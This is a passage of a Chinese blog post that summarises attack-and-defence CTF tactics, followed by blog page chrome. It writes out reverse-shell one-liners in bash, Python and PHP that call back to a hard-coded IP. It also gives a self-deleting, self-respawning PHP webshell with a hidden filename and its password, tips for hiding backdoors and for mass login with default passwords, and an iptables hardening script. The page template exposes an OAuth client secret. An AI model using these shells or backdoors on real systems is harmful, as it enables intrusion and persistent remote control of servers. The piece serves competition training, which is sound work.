‐‐rate==1000<br>比nmap快<br>或者arp‐scan<br>代码审计<br>工具:D盾，seay源码审计，rip<br>一般会有最简单的eval后门，反序列化漏洞，命令执行<br>危险函数查找:eval,assert,system等<br>一些常见的cms通用漏洞<br>Metinfo 6.0.0 众多漏洞分析<br>找完以后告诉防守更改文件<br>默认密码批量扫描<br>拿到密码后先更改，然后用默认密码去批量登录其他的主机<br>后门隐藏<br>…目录<br>.shell.php<br>ls看不见<br>一句话反弹shell<br>bash<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash ‐i &gt;&amp; /dev/tcp/192.168.0.103/8080 0&gt;&amp;1</span><br></pre></td></tr></table></figure><br>python<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python ‐c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.S</span></span><br><span class="line"><span class="string">OCK_STREAM);s.connect((&quot;192.168.31.41&quot;,8080));os.dup2(s.fileno(),0); os.dup2</span></span><br><span class="line"><span class="string">(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;‐i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure><br>php<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php ‐r <span class="string">&#x27;$sock=fsockopen(&quot;192.168.31.41&quot;,8080);exec(&quot;/bin/sh ‐i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;</span></span><br><span class="line"><span class="string">3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure><br>反弹的端口 192.168.10.234，则端口为8234，统一管理<br>不死马<br>php文件循环生成，建议放在…目录，文件名为.index.php<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ignore_user_abort(true);</span><br><span class="line">set_time_limit(0);</span><br><span class="line">unlink(__FILE__);</span><br><span class="line">$file = &#x27;./.index.php&#x27;;</span><br><span class="line">$code = &#x27;&lt;?php if(md5($_POST[&quot;pass&quot;])==&quot;3a50065e1709acc47ba0c9238294364f&quot;)</span><br><span class="line">&#123;@eval($_POST[a]);&#125; ?&gt;&#x27;;</span><br><span class="line">//pass=Sn3rtf4ck 马儿用法：fuckyou.php?pass=Sn3rtf4ck&amp;a=command</span><br><span class="line">while (1)&#123;</span><br><span class="line">file_put_contents($file,$code);</span><br><span class="line">usleep(5000);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><br>防守:<br>弱口令<br>大多是mysql，在php文件如config.php中可以看见信息<br>mysql更改密码:xxx<br>mysql禁止远程登录:xxx<br>防火墙配置<br>ubuntu‐ufw<br>centos7‐firewalld<br>centos6‐iptables<br>网上有awd配置防火墙的一键脚本<br>如：只允许团队的ip登录主机，只开放80，22端口<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line">#Allow youself Ping other hosts , prohibit others Ping you</span><br><span class="line">iptables ‐A INPUT ‐p icmp ‐‐icmp‐type 8 ‐s 0/0 ‐j DROP</span><br><span class="line">iptables ‐A OUTPUT ‐p icmp ‐‐icmp‐type 8 ‐s 0/0 ‐j ACCEPT</span><br><span class="line">#Close all INPUT FORWARD OUTPUT, just open some ports</span><br><span class="line">iptables ‐P INPUT DROP</span><br><span class="line">iptables ‐P FORWARD DROP</span><br><span class="line">iptables ‐P OUTPUT DROP</span><br><span class="line">#Open ssh</span><br><span class="line">iptables ‐A INPUT ‐p tcp ‐‐dport 22 ‐j ACCEPT</span><br><span class="line">iptables ‐A OUTPUT ‐p tcp ‐‐sport 22 ‐j ACCEPT</span><br><span class="line">#Open port 80</span><br><span class="line">iptables ‐A INPUT ‐p tcp ‐‐dport 80 ‐j ACCEPT</span><br><span class="line">iptables ‐A OUTPUT ‐p tcp ‐‐sport 80 ‐j ACCEPT</span><br><span class="line">#Open multiport</span><br><span class="line">#iptables ‐A INPUT ‐p tcp ‐m multiport ‐‐dport 22,80,8080,8081 ‐j ACCEPT</span><br><span class="line">#Control IP connection</span><br><span class="line">#The maximum number of connections for a single IP is 30</span><br><span class="line">iptables ‐I INPUT ‐p tcp ‐‐dport 80 ‐m connlimit ‐‐connlimit‐above 30 ‐j RE</span><br><span class="line">JECT</span><br><span class="line">#A single IP allows up to 15 new connections in 60 seconds</span><br><span class="line">iptables ‐A INPUT ‐p tcp ‐‐dport 80 ‐m recent ‐‐name BAD_HTTP_ACCESS ‐‐upda</span><br><span class="line">te ‐‐seconds 60 ‐‐hitcount 15 ‐j REJECT</span><br><span class="line">iptables ‐A INPUT ‐p tcp ‐‐dport 80 ‐m recent ‐‐name BAD_HTTP_ACCESS ‐‐set</span><br><span class="line">‐j ACCEPT</span><br><span class="line">#Prevent port reuse</span><br><span class="line">iptables ‐A OUTPUT ‐p tcp ‐‐sport 22 ‐m state ‐‐state ESTABLISHED ‐j ACCEPT</span><br><span class="line">iptables ‐A OUTPUT ‐p tcp ‐‐sport 80 ‐m state ‐‐state ESTABLISHED ‐j ACCEPT</span><br><span class="line">iptables ‐A OUTPUT ‐p tcp ‐‐sport 443 ‐m state ‐‐state ESTABLISHED ‐j ACCEP</span><br><span class="line">T</span><br><span class="line">#Filter abnormal packets</span><br><span class="line">iptables ‐A INPUT ‐i eth1 ‐p tcp ‐‐tcp‐flags SYN,RST,ACK,FIN SYN ‐j DROP</span><br><span class="line">iptables ‐A INPUT ‐p tcp ‐‐tcp‐flags ALL FIN,URG,PSH ‐j DROP</span><br><span class="line">iptables ‐A INPUT ‐p tcp ‐‐tcp‐flags ALL NONE ‐j DROP</span><br><span class="line">iptables ‐A INPUT ‐p tcp ‐‐tcp‐flags ALL SYN,RST,ACK,FIN,URG ‐j DROP</span><br><span class="line">iptables ‐A INPUT ‐p tcp ‐‐tcp‐flags ALL SYN,FIN,RST ‐j DROP</span><br><span class="line">iptables ‐A INPUT ‐p tcp ‐‐tcp‐flags ALL SYN,FIN,PSH ‐j DROP</span><br><span class="line">iptables ‐A INPUT ‐p tcp ‐‐tcp‐flags ALL SYN,FIN,RST,PSH ‐j DROP</span><br><span class="line">iptables ‐A INPUT ‐p tcp ‐‐tcp‐flags SYN,RST SYN,RST ‐j DROP</span><br><span class="line">iptables ‐A INPUT ‐p tcp ‐‐tcp‐flags SYN,FIN SYN,FIN ‐j DROP</span><br><span class="line">#Prevent DoS attacks</span><br><span class="line">iptables ‐A INPUT ‐p tcp ‐‐dport 80 ‐m limit ‐‐limit 20/minute ‐‐limit‐burs</span><br><span class="line">t 100 ‐j ACCEPT</span><br><span class="line">#Discard unfamiliar TCP response packs to prevent rebound attacks</span><br><span class="line">iptables ‐A INPUT ‐m state ‐‐state NEW ‐p tcp ! ‐‐syn ‐j DROP</span><br><span class="line">iptables ‐A FORWARD ‐m state ‐‐state NEW ‐p tcp ‐‐syn ‐j DROP</span><br></pre></td></tr></table></figure><br>waf配置<br>上通防可能会被监测到，比赛加固30分钟完事后，开始比赛就上waf，每个php文件首行<br>require_once(‘waf.php’);，但是要注意不要影响正常的访问<br>如果一些熟悉的cms去配置文件更改，如include文件夹，默认每个文件都会include<br>waf去github搜<br>查看用户<br>w<br>踢出用户:xxx<br>不死马删除<br>利用bash脚本条件竞争的方式循环删除<br>一句话shell<br>查看端口状态netstat<br>ps ‐a<br>kill进程等<br>脚本<br>建议将文件保存在本地，5分钟还原一次服务器<br>```</p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://iloveflag.github.io">iloveflag</a>
+            <p>原文链接：<a href="https://iloveflag.github.io/2020/09/08/awd%E6%80%BB%E7%BB%93/">https://iloveflag.github.io/2020/09/08/awd%E6%80%BB%E7%BB%93/</a>
+            <p>发表日期：<a href="https://iloveflag.github.io/2020/09/08/awd%E6%80%BB%E7%BB%93/">September 8th 2020, 10:43:51 am</a>
+            <p>更新日期：<a href="https://iloveflag.github.io/2020/09/08/awd%E6%80%BB%E7%BB%93/">February 14th 2025, 10:45:19 pm</a>
+            <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2020/09/23/RSA%E4%B8%8E%E8%B4%B9%E9%A9%AC%E5%B0%8F%E5%AE%9A%E7%90%86/" title= "RSA与费马小定理">
+                    <div class="nextTitle">RSA与费马小定理</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2020/08/05/CyBRICS2020/" title= "CyBRICS2020">
+                    <div class="prevTitle">CyBRICS2020</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- gitalk评论 -->
+
+    <div id="comment-container"></div>
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1.6.0/dist/gitalk.css">
+    <script src="https://cdn.jsdelivr.net/npm/gitalk@1.6.0/dist/gitalk.min.js"></script>
+    <script>
+        var gitalk = new Gitalk({
+            clientID: '54c5c6bc527e05e0c678',
+            clientSecret: '9d67009d7099559da82f61c73abafce18d09d6d9',
+            id: '1599533031000',
+            repo: 'iloveflag.github.io',
+            owner: 'iloveflag',
+            admin: "iloveflag",
+            createIssueManually: true,
+            distractionFreeMode: false
+        })
+        gitalk.render('comment-container')
+    </script>
+    
+    <!-- utteranc评论 -->
+
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+    
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:iloveflag@outlook.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/iloveflag" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/atom.xml" class="iconfont-archer rss" target="_blank" title=rss></a>
+            
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 61
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2023 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/08</span><a class="archive-post-title" href= "/2023/09/08/poc-collection/" >poc_collection</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2022 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/12</span><a class="archive-post-title" href= "/2022/12/12/QVD-2022-46174-thinkphp%E5%A4%9A%E8%AF%AD%E8%A8%80RCE/" >QVD-2022-46174-thinkphp多语言RCE</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2021 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/06</span><a class="archive-post-title" href= "/2021/11/06/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E7%8E%8B%E9%81%93%E8%80%83%E7%A0%94%E5%A4%8D%E4%B9%A0%E7%AC%94%E8%AE%B0/" >数据结构-王道考研复习笔记</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/23</span><a class="archive-post-title" href= "/2020/09/23/RSA%E4%B8%8E%E8%B4%B9%E9%A9%AC%E5%B0%8F%E5%AE%9A%E7%90%86/" >RSA与费马小定理</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/08</span><a class="archive-post-title" href= "/2020/09/08/awd%E6%80%BB%E7%BB%93/" >awd总结</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/05</span><a class="archive-post-title" href= "/2020/08/05/CyBRICS2020/" >CyBRICS2020</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/09</span><a class="archive-post-title" href= "/2020/07/09/%E6%B5%85%E8%B0%88phar%E6%96%87%E4%BB%B6%E5%9C%A8ctf%E4%B8%AD%E7%9A%84%E5%BA%94%E7%94%A8/" >浅谈phar文件在ctf中的应用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/01</span><a class="archive-post-title" href= "/2020/07/01/2020%E8%85%BE%E8%AE%AF%E7%8A%80%E7%89%9B%E9%B8%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8T-Star%E9%AB%98%E6%A0%A1%E6%8C%91%E6%88%98%E8%B5%9Bwp/" >2020腾讯犀牛鸟网络安全T-Star高校挑战赛wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/14</span><a class="archive-post-title" href= "/2020/06/14/nginx-php-vscode-xdebug/" >nginx-php-vscode-xdebug</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/13</span><a class="archive-post-title" href= "/2020/06/13/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84-%E6%B5%99%E5%A4%A7%E7%89%88%E5%92%95%E5%92%95%E5%92%95%E4%BA%86/" >数据结构-浙大版咕咕咕了</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/16</span><a class="archive-post-title" href= "/2020/01/16/from-img-to-xss/" >from_img_to_xss</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/26</span><a class="archive-post-title" href= "/2019/12/26/hash-hmac-php-bug/" >hash_hmac_php_bug</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/27</span><a class="archive-post-title" href= "/2019/08/27/%E4%BB%8E%E9%9D%A2%E8%AF%95%E4%B8%AD%E5%8F%91%E7%8E%B0%E6%9C%AA%E5%AD%A6%E5%88%B0%E7%9A%84%E7%9F%A5%E8%AF%86%E7%82%B9/" >从面试中发现未学到的知识点</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/07</span><a class="archive-post-title" href= "/2019/08/07/hitcon-ctf-2017-ssrfme/" >hitcon-ctf-2017-ssrfme</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/04</span><a class="archive-post-title" href= "/2019/08/04/de1tactf2019_ssrf_me/" >de1tactf2019_ssrf_me</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/04</span><a class="archive-post-title" href= "/2019/08/04/thinkphp5-0-sql-injection%E5%88%86%E6%9E%90/" >thinkphp5.0_sql_injection分析</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/13</span><a class="archive-post-title" href= "/2019/07/13/sql%E6%B3%A8%E5%85%A5/" >sql注入</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/12</span><a class="archive-post-title" href= "/2019/07/12/%E5%BF%AB%E9%80%9F%E6%9F%A5%E8%AF%A2%E6%95%B4%E7%90%86/" >快速查询整理</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/15</span><a class="archive-post-title" href= "/2019/06/15/rbash%E9%80%83%E9%80%B8/" >rbash逃逸</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/23</span><a class="archive-post-title" href= "/2019/05/23/vulhub-learning/" >vulhub-learning</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/14</span><a class="archive-post-title" href= "/2019/05/14/apache%E5%9F%BA%E4%BA%8E%E5%A4%9Aip%E7%9A%84%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BA%E9%85%8D%E7%BD%AE+%E6%96%87%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%92%8C%E8%B4%A6%E5%8F%B7%E5%AF%86%E7%A0%81/" >apache基于多ip的虚拟主机配置+文件服务器和账号密码</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/05</span><a class="archive-post-title" href= "/2019/05/05/pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" >pwn学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/11</span><a class="archive-post-title" href= "/2019/04/11/2019%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91web/" >2019西湖论剑web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/22</span><a class="archive-post-title" href= "/2019/03/22/Python%E8%84%9A%E6%9C%AC%E4%B8%8EMetasploit%E4%BA%A4%E4%BA%92%E6%89%B9%E9%87%8F%E4%BA%A7%E5%87%BAMS17_010_shell/" >Python脚本与Metasploit交互批量产出MS17_010 shell</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/05</span><a class="archive-post-title" href= "/2019/03/05/pentesterlab%E4%B8%ADxss+Code%20injection%E7%9A%84%E7%BB%83%E4%B9%A0/" >pentesterlab中xss+Code injection的练习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/22</span><a class="archive-post-title" href= "/2019/02/22/hgame2019%20%E9%83%A8%E5%88%86web-wp/" >hgame2019 部分web-wp</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/08</span><a class="archive-post-title" href= "/2019/02/08/phpMyAdmin%E6%8F%90%E6%9D%83/" >phpMyAdmin提权</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/27</span><a class="archive-post-title" href= "/2018/11/27/%E7%94%A8updatexml%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E6%8A%80%E6%9C%AF%E8%A7%A3%E5%87%BA2018nctf%20%E6%BB%B4!%E6%99%A8%E8%B7%91%E6%89%93%E5%8D%A1/" >用updatexml报错注入技术解出2018nctf 滴!晨跑打卡</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">11/18</span><a class="archive-post-title" href= "/2018/11/18/2018hctf%20web/" >2018hctf web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/26</span><a class="archive-post-title" href= "/2018/10/26/%E5%BC%82%E6%88%96%E7%9A%84%E7%A0%94%E7%A9%B6/" >异或的研究</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/17</span><a class="archive-post-title" href= "/2018/10/17/2018%E6%9D%AD%E7%94%B5%E5%85%AC%E6%B5%8Bctf%20writeup/" >2018杭电公测ctf writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/14</span><a class="archive-post-title" href= "/2018/10/14/'%E2%80%9C%E7%99%BE%E5%BA%A6%E6%9D%AF%E2%80%9D2017%E5%B9%B4%E6%98%A5%E7%A7%8B%E6%AC%A2%E4%B9%90%E8%B5%9B%EF%BC%9A%20%20%E4%B8%80%E4%B8%AAip%E5%8F%AA%E6%9C%89%E4%B8%80%E4%B8%AA%E6%9C%BA%E4%BC%9A%EF%BC%8C%E5%93%88%E5%93%88%E5%93%88%E3%80%82'/" >百度杯2017年春秋欢乐赛</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/10</span><a class="archive-post-title" href= "/2018/10/10/Centos7%20%E5%AE%9E%E7%8E%B0ngrok%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/" >Centos7 实现ngrok内网穿透</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">10/08</span><a class="archive-post-title" href= "/2018/10/08/kali%20%E5%9F%BA%E6%9C%AC%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85/" >kali 基本软件安装</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/23</span><a class="archive-post-title" href= "/2018/09/23/%E5%AE%89%E6%81%92%E6%9D%AF9%E6%9C%88misc1%20crc32%E7%A2%B0%E6%92%9E/" >2018安恒杯9月misc1 crc32碰撞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/23</span><a class="archive-post-title" href= "/2018/09/23/%E7%AC%AC%E4%B8%80%E5%B1%8A%E7%99%BE%E5%BA%A6%E6%9D%AF%20upload/" >第一届百度杯 upload</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/20</span><a class="archive-post-title" href= "/2018/09/20/wanna-to-see-your-hat-writeup/" >wanna to see your hat? writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
